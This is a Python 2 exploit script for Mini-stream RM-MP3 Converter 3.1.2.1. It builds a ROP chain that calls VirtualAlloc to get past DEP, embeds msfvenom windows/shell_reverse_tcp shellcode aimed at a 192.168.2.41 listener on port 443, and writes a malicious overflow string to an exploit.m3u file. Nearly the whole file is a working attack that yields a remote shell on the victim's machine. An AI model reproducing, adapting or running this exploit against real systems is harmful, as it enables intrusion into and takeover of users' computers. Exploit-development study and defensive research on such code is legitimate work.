#!/usr/bin/python
# Written By: Eric Van Zutphen
# Purpose: Mini-stream RM-MP3 Converter 3.1.2.1.2010.03.30 DEP Bypass Exploit Using VirtualAlloc() Win API Call

import sys, struct
 
#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------------------------#
#---------------------------------------------------------[Registers]-#
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 => ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#

#-------------------------Return to Stack-----------------------------#
rop = ''
rop += struct.pack('<L',0x10019C60)	# RETN # EIP Offset 
rop += struct.pack('<L',0x41414141) # padding to compensate 4-bytes at ESP
#----------------------Rop Nop in EDI---------------------------------#
rop += struct.pack('<L',0x1002e216) # POP EDI # RETN
rop += struct.pack('<L',0x10019C60)	# RETN # ROP-Nop


#---------------------ECX -> flProtect (0x40)-------------------------#
rop += struct.pack('<L',0x10021282) # POP ECX #RETN
rop += struct.pack('<L',0xffffffff) # POP INTO ECX
rop += struct.pack('<L',0x1002e01b) # INC ECX# RETN
rop += struct.pack('<L',0x1002e01b) # INC ECX# RETN
rop += struct.pack('<L',0x1002a487) # Add ECX to ECX to MAKE 0x2
rop += struct.pack('<L',0x1002a487) # Add ECX to ECX to MAKE 0x4
rop += struct.pack('<L',0x1002a487) # Add ECX to ECX to MAKE 0x8
rop += struct.pack('<L',0x1002a487) # Add ECX to ECX to MAKE 0x10
rop += struct.pack('<L',0x1002a487) # Add ECX to ECX to MAKE 0x20
rop += struct.pack('<L',0x1002a487) # Add ECX to ECX to MAKE 0x40


#--------------------ESI -> VirtualAlloc------------------------------#
rop += struct.pack('<L',0x1002A649) # POP EAX # RETN # POP VirtualAlloc() into EAX
rop += struct.pack('<L',0x1005d060) # VirtualAlloc() Adress
rop += struct.pack('<L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN # Pointer to VirtualAlloc
rop += struct.pack('<L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN (EAX -> ESI)

#--------------------EDX -> flAllocationType (0x1000)-----------------#
rop += struct.pack('<L',0x1003fb3f) # MOV, EDX,E58B0001 # POP EBP # RETN
rop += struct.pack('<L',0x41414141) # Padding
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0x1A750FFF) # EBX + EDX => 1000 flAllocationType (FFFFFFFF-E58B0001=1A74FFFE => 1A74FFFE+00001001=1A750FFF)
rop += struct.pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX + RETN # This will make 0x1000 in EBX
rop += struct.pack('<L',0x10019C60) # ROP NOP Compensate
rop += struct.pack('<L',0x10019C60) # ROP NOP Compensate
rop += struct.pack('<L',0x10019C60) # ROP NOP Compensate
rop += struct.pack('<L',0x10019C60) # ROP NOP Compensate
rop += struct.pack('<L',0x10019C60) # ROP NOP Compensate
rop += struct.pack('<L',0x10019C60) # ROP NOP Compensate


#--------------EBP -> Redirect Execution flow to ESP------------------#
rop += struct.pack('<L',0x100532ed) # Redirect Execution Flow to ESP # RETN
rop += struct.pack('<L',0x100371f5) # CALL ESP 


#------------------------EBX -> dwSize (0x1)--------------------------#
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0xffffffff) # Pop into EBX
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN # This will increase EBX to 0x00000001


#---------------------EAX -> Fill with a regular NOP------------------#
rop += struct.pack('<L',0x10030361) # POP EAX # RETN
rop += struct.pack('<L',0x90909090) # NOP (just a regular NOP)
rop += struct.pack('<L',0x10014720) # PUSHAD # RETN (can be found in rop_virtualprotect.txt)

nops = '\x90' * 20

"""
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp EXITFUNC=seh -b '\x00' -f python LHOST=192.168.2.41 LPORT=443 -v shellcode
Payload size: 351 bytes
"""
shellcode =  ""
shellcode += "\xbd\xde\xbf\xad\x86\xda\xc5\xd9\x74\x24\xf4\x5b"
shellcode += "\x31\xc9\xb1\x52\x83\xeb\xfc\x31\x6b\x0e\x03\xb5"
shellcode += "\xb1\x4f\x73\xb5\x26\x0d\x7c\x45\xb7\x72\xf4\xa0"
shellcode += "\x86\xb2\x62\xa1\xb9\x02\xe0\xe7\x35\xe8\xa4\x13"
shellcode += "\xcd\x9c\x60\x14\x66\x2a\x57\x1b\x77\x07\xab\x3a"
shellcode += "\xfb\x5a\xf8\x9c\xc2\x94\x0d\xdd\x03\xc8\xfc\x8f"
shellcode += "\xdc\x86\x53\x3f\x68\xd2\x6f\xb4\x22\xf2\xf7\x29"
shellcode += "\xf2\xf5\xd6\xfc\x88\xaf\xf8\xff\x5d\xc4\xb0\xe7"
shellcode += "\x82\xe1\x0b\x9c\x71\x9d\x8d\x74\x48\x5e\x21\xb9"
shellcode += "\x64\xad\x3b\xfe\x43\x4e\x4e\xf6\xb7\xf3\x49\xcd"
shellcode += "\xca\x2f\xdf\xd5\x6d\xbb\x47\x31\x8f\x68\x11\xb2"
shellcode += "\x83\xc5\x55\x9c\x87\xd8\xba\x97\xbc\x51\x3d\x77"
shellcode += "\x35\x21\x1a\x53\x1d\xf1\x03\xc2\xfb\x54\x3b\x14"
shellcode += "\xa4\x09\x99\x5f\x49\x5d\x90\x02\x06\x92\x99\xbc"
shellcode += "\xd6\xbc\xaa\xcf\xe4\x63\x01\x47\x45\xeb\x8f\x90"
shellcode += "\xaa\xc6\x68\x0e\x55\xe9\x88\x07\x92\xbd\xd8\x3f"
shellcode += "\x33\xbe\xb2\xbf\xbc\x6b\x14\xef\x12\xc4\xd5\x5f"
shellcode += "\xd3\xb4\xbd\xb5\xdc\xeb\xde\xb6\x36\x84\x75\x4d"
shellcode += "\xd1\x6b\x21\x4f\x08\x04\x30\x4f\x4b\x6f\xbd\xa9"
shellcode += "\x21\x9f\xe8\x62\xde\x06\xb1\xf8\x7f\xc6\x6f\x85"
shellcode += "\x40\x4c\x9c\x7a\x0e\xa5\xe9\x68\xe7\x45\xa4\xd2"
shellcode += "\xae\x5a\x12\x7a\x2c\xc8\xf9\x7a\x3b\xf1\x55\x2d"
shellcode += "\x6c\xc7\xaf\xbb\x80\x7e\x06\xd9\x58\xe6\x61\x59"
shellcode += "\x87\xdb\x6c\x60\x4a\x67\x4b\x72\x92\x68\xd7\x26"
shellcode += "\x4a\x3f\x81\x90\x2c\xe9\x63\x4a\xe7\x46\x2a\x1a"
shellcode += "\x7e\xa5\xed\x5c\x7f\xe0\x9b\x80\xce\x5d\xda\xbf"
shellcode += "\xff\x09\xea\xb8\x1d\xaa\x15\x13\xa6\xd4\xe4\xa9"
shellcode += "\x33\x40\x5f\x58\x7e\x0c\x60\xb7\xbd\x29\xe3\x3d"
shellcode += "\x3e\xce\xfb\x34\x3b\x8a\xbb\xa5\x31\x83\x29\xc9"
shellcode += "\xe6\xa4\x7b"


crash = "http://." + "A"*17416 + rop + nops + shellcode + "C"*(7572-len(rop) - len(nops) - len(shellcode))

print "\nLength of Payload: " + str(len(crash))
print "[+]ShellcoderZ.com[+]"


exploit_file = open ('exploit.m3u', "w")
exploit_file.write(crash)
exploit_file.close()
